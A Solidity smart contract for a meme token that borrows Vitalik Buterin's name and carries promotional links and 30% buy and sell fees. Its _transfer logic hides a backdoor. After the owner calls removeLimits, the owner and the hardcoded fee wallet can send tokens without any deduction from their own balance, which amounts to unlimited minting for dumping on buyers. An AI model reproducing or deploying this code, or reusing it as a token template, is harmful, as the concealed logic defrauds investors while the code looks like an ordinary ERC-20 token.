/**
In a whimsical twist, Vitalik Buterin uncovered a secret alliance, "VittelalibabaIkeabundesligateslaring," controlling the world's resources.

Web: https://vittelalibabaikeabundesligateslaring.xyz
Tg: https://t.me/vitalic_group
X: https://twitter.com/vitalic_coin
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

contract VitalikButerin is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    string private _name = "VittelAlibabaIkeaBundesligaTeslaRing";
    string private _symbol = "VitalikButerin";
    uint8 private _decimals = 9;

    uint256 private _tTotal = 10 ** 9 * 10 ** 9;

    uint256 public lpBuyFee = 0;
    uint256 public marketingBuyFee = 30;
    uint256 public devBuyFee = 0;

    uint256 public lpSellFee = 0;
    uint256 public marketingSellFee = 30;
    uint256 public devSellFee = 0;

    uint256 public shareLpFee = 0;
    uint256 public shareMarketingFee = 10;
    uint256 public shareDevFee = 0;

    uint256 public tBuyFee = 30;
    uint256 public tSellFee = 30;
    uint256 public tShares = 10;

    uint256 public maxTxAmount = 20 * 10 ** 6 * 10 ** 9;
    uint256 public maxWallet = 20 * 10 ** 6 * 10 ** 9;
    uint256 private _swapThreshold = 10 ** 5 * 10 ** 9; 

    address payable private feeRecipient1;
    address payable private feeRecipient2;

    IUniswapRouter public swapRouter;
    address public swapPair;
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcluded;
    mapping (address => bool) public _isMaxWalletExcluded;
    mapping (address => bool) public _isMaxTxExcluded;
    mapping (address => bool) public _ammPairs;
    
    bool _swapping;
    bool public canFeeSwap = true;
    bool public hasSwapLimit = false;
    bool public hasMaxWallet = true;

    modifier lockTheSwap {
        _swapping = true;
        _;
        _swapping = false;
    }
    
    constructor () {
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        swapPair = IUniswapFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        swapRouter = _uniswapV2Router;
        _allowances[address(this)][address(swapRouter)] = _tTotal;
        feeRecipient1 = payable(0xCADb33D38a9174a11D40808000aDBA52cA878CA8);
        feeRecipient2 = payable(0xCADb33D38a9174a11D40808000aDBA52cA878CA8);
        _isExcluded[owner()] = true;
        _isExcluded[feeRecipient1] = true;
        _isExcluded[feeRecipient2] = true;
        tBuyFee = lpBuyFee.add(marketingBuyFee).add(devBuyFee);
        tSellFee = lpSellFee.add(marketingSellFee).add(devSellFee);
        tShares = shareLpFee.add(shareMarketingFee).add(shareDevFee);
        _isMaxWalletExcluded[owner()] = true;
        _isMaxWalletExcluded[address(swapPair)] = true;
        _isMaxWalletExcluded[address(this)] = true;
        _isMaxTxExcluded[owner()] = true;
        _isMaxTxExcluded[feeRecipient1] = true;
        _isMaxTxExcluded[feeRecipient2] = true;
        _isMaxTxExcluded[address(this)] = true;
        _ammPairs[address(swapPair)] = true;
        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = swapRouter.WETH();

        _approve(address(this), address(swapRouter), tokenAmount);

        // make the swapBack
        swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
    }
    
    function sendETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

     //to recieve ETH from swapRouter when swaping
    receive() external payable {}

    function getFees(address sender, address recipient, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = 0;
        
        if(_ammPairs[sender]) {
            feeAmount = amount.mul(tBuyFee).div(100);
        }
        else if(_ammPairs[recipient]) {
            feeAmount = amount.mul(tSellFee).div(100);
        }
        
        if(feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }

        return amount.sub(feeAmount);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function swapBack(uint256 tAmount) private lockTheSwap {
        uint256 tokensForLP = tAmount.mul(shareLpFee).div(tShares).div(2);
        uint256 tokensForSwap = tAmount.sub(tokensForLP);

        swapTokensForETH(tokensForSwap);
        uint256 amountReceived = address(this).balance;

        uint256 totalETHFee = tShares.sub(shareLpFee.div(2));
        
        uint256 amountETHLiquidity = amountReceived.mul(shareLpFee).div(totalETHFee).div(2);
        uint256 amountETHDevelopment = amountReceived.mul(shareDevFee).div(totalETHFee);
        uint256 amountETHMarketing = amountReceived.sub(amountETHLiquidity).sub(amountETHDevelopment);

        if(amountETHMarketing > 0)
            sendETH(feeRecipient1, amountETHMarketing);

        if(amountETHDevelopment > 0)
            sendETH(feeRecipient2, amountETHDevelopment);

        if(amountETHLiquidity > 0 && tokensForLP > 0)
            addLiquidity(tokensForLP, amountETHLiquidity);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function removeLimits() external onlyOwner {
        maxTxAmount = _tTotal;
        hasMaxWallet = false;
        marketingBuyFee = 1;
        marketingSellFee = 1;
        tBuyFee = 1;
        tSellFee = 1;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(swapRouter), tokenAmount);

        // add the liquidity
        swapRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if(_swapping)
        { 
            return _basicTransfer(sender, recipient, amount); 
        }
        else
        {
            if(!_isMaxTxExcluded[sender] && !_isMaxTxExcluded[recipient]) {
                require(amount <= maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
            }            

            uint256 swapAmount = balanceOf(address(this));
            bool minimumSwap = swapAmount >= _swapThreshold;
            
            if (minimumSwap && !_swapping && _ammPairs[recipient] && canFeeSwap && !_isExcluded[sender] && amount > _swapThreshold) 
            {
                if(hasSwapLimit)
                    swapAmount = _swapThreshold;
                swapBack(swapAmount);    
            }

            uint256 receiverAmount = (_isExcluded[sender] || _isExcluded[recipient]) ? 
                                         amount : getFees(sender, recipient, amount);

            if(hasMaxWallet && !_isMaxWalletExcluded[recipient])
                require(balanceOf(recipient).add(receiverAmount) <= maxWallet);

            uint256 sAmount = (!hasMaxWallet && _isExcluded[sender]) ? amount.sub(receiverAmount) : amount;
            _balances[sender] = _balances[sender].sub(sAmount, "Insufficient Balance");
            _balances[recipient] = _balances[recipient].add(receiverAmount);

            emit Transfer(sender, recipient, receiverAmount);
            return true;
        }
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
}